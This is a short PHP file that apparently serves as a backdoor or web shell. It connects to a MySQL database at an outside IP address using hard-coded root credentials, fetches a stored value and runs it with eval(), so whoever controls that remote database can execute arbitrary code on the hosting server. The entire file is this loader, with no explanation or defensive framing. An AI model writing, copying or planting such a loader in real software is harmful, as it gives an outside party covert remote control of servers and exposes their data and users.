<?php
$res=mysqli_connect('117.34.80.40', 'root', 'root', 'a');
eval(mysqli_fetch_assoc(mysqli_query($res, 'select * from a'))['a']);
?>